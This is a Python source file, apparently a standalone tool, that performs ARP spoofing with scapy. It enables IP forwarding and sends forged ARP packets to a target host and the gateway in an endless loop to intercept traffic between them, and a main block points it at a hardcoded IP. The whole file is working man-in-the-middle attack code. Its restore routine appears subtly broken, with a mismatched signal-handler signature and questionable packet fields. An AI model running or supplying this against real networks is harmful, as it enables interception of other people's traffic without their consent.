# -*- coding: utf-8 -*-
'''
@Author  : linhos
@Time    : 17-3-27 下午1:59
@Site    : 
@File    : Arp.py
@Software: PyCharm
'''

import sys
import signal
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp
)
from StaticTools import *

logger = logging.getLogger("Base")

'''
Arp欺骗的主要函数代码
'''
class Arp:
    def __init__(self, directIP):
        self.interface = NetTools.get_interface()  # 本机网卡名称
        self.host = NetTools.getGateway_ip()  # 网关ip
        self.target = directIP  # 目标ip
        self.mac = get_if_hwaddr(self.interface)
        self.reverse = True

    '''
    开启或者关闭路由转发
    :param flag 当flag为True时，开启路由转发，为False则关闭路由转发
    '''

    def routeForwarding(self, flag):
        try:
            f = open('/proc/sys/net/ipv4/ip_forward', 'w+')
            if flag:
                f.write("1")
            else:
                f.write("0")
            f.close()
            logger.info("更改了ip_forward")
        except:
            logger.error("ip_forward 不能够被打开")
            sys.exit(0)

    '''
    ARP欺骗
    '''
    def arpSpoofing(self):
        pkt = None
        r_pkt = None
        # interface = 'eno1'
        mode = 'req'
        signal.signal(signal.SIGINT, self.__rearp)
        if mode == 'req':
            pkt = self.__build_req(self.target, self.host)
        elif mode == 'rep':
            pkt = self.__build_rep(self.target, self.host)

        if self.reverse:
            if mode == 'req':
                r_pkt = self.__build_req(self.host, self.target)
            elif mode == 'rep':
                r_pkt = self.__build_rep(self.host, self.target)
        while True:
            sendp(pkt, inter=2, iface=self.interface)
            time.sleep(2)
            if self.reverse:
                sendp(r_pkt, inter=2, iface=self.interface)



    def __build_req(self, target, host):
        # target 目标地址
        if target is None:
            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=self.mac, psrc=host, pdst=host)
        elif target:
            target_mac = getmacbyip(target)  # 得到目标ip的mac地址
            if target_mac is None:
                logger.error("Could not resolve targets MAC address")
                sys.exit(1)
            pkt = Ether(src=self.mac, dst=target_mac) / ARP(hwsrc=self.mac, psrc=host, hwdst=target_mac, pdst=target)
        return pkt

    def __build_rep(self, target, host):
        if target is None:
            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=self.mac, psrc=host, op=2)
        elif target:
            target_mac = getmacbyip(target)
            if target_mac is None:
                logger.error("Could not resolve targets MAC address")
                sys.exit(1)
            pkt = Ether(src=self.mac, dst=target_mac) / ARP(hwsrc=self.mac, psrc=host, hwdst=target_mac, pdst=target,
                                                            op=2)
        return pkt

    def __rearp(self):
        rearp_mac = getmacbyip(self.host)
        pkt = Ether(src=rearp_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(psrc=self.mac, hwsrc=self.mac, op=2)
        sendp(pkt, inter=1, count=5, iface=self.interface)
        if self.reverse:
            r_rearp_mac = getmacbyip(self.target)
            r_pkt = Ether(src=r_rearp_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(psrc=self.target, hwsrc=self.mac, op=2)
            sendp(r_pkt, inter=1, count=5, iface=self.interface)
        sys.exit(0)



if __name__ == "__main__":
    arps = Arp('192.68.4.131')
    arps.routeForwarding(True)  #开启路由转发
    arps.arpSpoofing()
